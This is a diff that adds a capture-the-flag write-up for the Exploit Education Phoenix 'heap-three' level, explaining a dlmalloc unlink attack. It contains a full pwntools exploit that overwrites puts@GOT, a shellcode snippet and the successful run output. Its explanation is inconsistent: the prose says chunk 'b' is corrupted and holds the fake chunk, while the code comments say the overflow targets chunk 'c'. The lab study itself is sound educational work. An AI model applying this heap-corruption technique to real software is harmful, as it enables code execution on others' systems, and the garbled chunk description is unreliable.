@@ -457,3 +457,134 @@ Exploitation:
 	- and the freed memory is allocated to the **service**.
 	- at last when the user logged it will be checking the previous memory.
 	- if we have provided with the same characters as login it will give **You are already Logged In!**.
+
+## Heap-Three:
+### **Exploiting Doug Lea's Malloc (dlmalloc) with Unlink Attack**  
+
+**Challenge**: `heap-three` from [Exploit Education Phoenix](https://exploit.education/phoenix/)  
+**Goal**: Hijack execution to call the `winner()` function by exploiting `free()`'s `unlink()` macro.  
+
+---
+
+ **1. Understanding the Target**  
+The program allocates **three heap chunks (`a`, `b`, `c`)** and frees them in reverse order (`free(c)`, `free(b)`, `free(a)`). Our goal is to:  
+- **Overflow `a` into `b`** to corrupt `b`'s metadata.  
+- **Trick `free()` into merging chunks incorrectly**, leading to arbitrary write via `unlink()`.  
+- **Overwrite `puts@GOT`** to redirect execution to `winner()`.  
+
+---
+ **2. Key Concepts**  
+### **Heap Chunk Structure**  
+Each chunk has metadata:  
+```c
+struct chunk {
+    size_t prev_size;  // Size of previous chunk (if free)
+    size_t size;       // Current chunk size + flags (e.g., `PREV_INUSE`)
+    char data[];       // User data
+};
+```
+- **`PREV_INUSE` (P-bit)**: Last bit of `size`.  
+  - `1` = Previous chunk is in use.  
+  - `0` = Previous chunk is free (can merge).  
+
+### **The `unlink()` Macro**  
+When `free()` merges chunks, it calls `unlink()`, which does:  
+```c
+FD = chunk->fd;  // Forward pointer  
+BK = chunk->bk;  // Backward pointer  
+FD->bk = BK;     // Writes BK to *(FD + 12)  
+BK->fd = FD;     // Writes FD to *(BK + 8)  
+```
+We abuse this to **overwrite `puts@GOT`**.  
+
+---
+
+ **3. Exploit Strategy**  
+### **Step 1: Overflow `a` into `b`**  
+We corrupt `b`'s metadata to:  
+1. **Set `b->size = -80`**  
+   - Clears `PREV_INUSE` (`P=0`), tricking `free()` into thinking the previous chunk (`a`) is free.  
+   - Negative size bypasses sanity checks (old `dlmalloc` bug).  
+
+2. **Set `b->prev_size = -4`**  
+   - Makes `free()` calculate `prev_chunk = current_chunk - (-4) = current_chunk + 4`.  
+   - Points **inside `b` itself**, allowing us to control `fd`/`bk`.  
+
+### **Step 2: Fake Chunk Inside `b`**  
+We craft a fake free chunk inside `b` with:  
+- **`fd = puts@GOT - 12`** (where `unlink()` will write).  
+- **`bk = shellcode_addr`** (address of our shellcode in `a`).  
+
+When `free(b)` runs:  
+```c
+FD = puts@GOT - 12  
+BK = shellcode_addr  
+*(FD + 12) = BK  // Overwrites puts@GOT with shellcode_addr  
+```
+
+### **Step 3: Shellcode Execution**  
+We place **shellcode in `a`** that calls `winner()`:  
+```asm
+push 0x80487d5  ; winner() address  
+ret             ; Jump to winner()
+```
+Now, when `puts()` is called, it jumps to `winner()` instead!  
+
+---
+
+ **4. Final Exploit Code**  
+```python
+from pwn import *
+
+# Addresses
+puts_got = 0x804c13c        # puts@GOT entry
+winner_addr = 0x80487d5     # winner() function
+shellcode_addr = 0xf7e6900c # Address of shellcode in 'a'
+
+# Shellcode: "push winner_addr; ret"
+shellcode = asm("push {}; ret".format(hex(winner_addr)))
+
+# Craft payload
+payload = ""
+
+# Chunk 'a' (contains shellcode + fake chunk metadata)
+payload += 'AAAA'           # Will be overwritten by FD
+payload += shellcode        # Shellcode to call winner()
+payload += ' '              # strcpy delimiter
+
+# Chunk 'b' (overflow into 'c')
+payload += 'B' * 32         # Fill chunk 'b'
+payload += p32(0xfffffffc)  # c->prev_size = -4 (points inside 'c')
+payload += p32(0xffffffb0)  # c->size = -80 (P=0, invalid size)
+payload += ' '              # strcpy delimiter
+
+# Chunk 'c' (fake chunk for unlink())
+payload += 'AAAA'           # Junk (prev_size of fake chunk)
+payload += p32(puts_got - 12)  # c->fd (where to write)
+payload += p32(shellcode_addr) # c->bk (what to write)
+
+print(payload)
+```
+
+---
+
+ **5. Running the Exploit**  
+```bash
+$ ./heap-three "$(python exploit.py)"
+Congratulations, you've completed this level! 
+```
+
+---
+
+ **6. Why This Works**  
+✅ **Heap Overflow**: Corrupts `b`'s metadata to control `unlink()`.  
+✅ **Fake Chunk**: Tricks `free()` into processing malicious `fd`/`bk`.  
+✅ **GOT Overwrite**: Hijacks `puts()` to jump to `winner()`.  
+
+This is a classic **dlmalloc unlink attack**—patched in modern `glibc` but still relevant for older binaries.  
+
+---
+### **Further Reading**  
+- [Understanding dlmalloc (Doug Lea's Malloc)](http://gee.cs.oswego.edu/dl/html/malloc.html)  
+- [Heap Exploitation Guide](https://heap-exploitation.dhavalkapil.com/)  
+
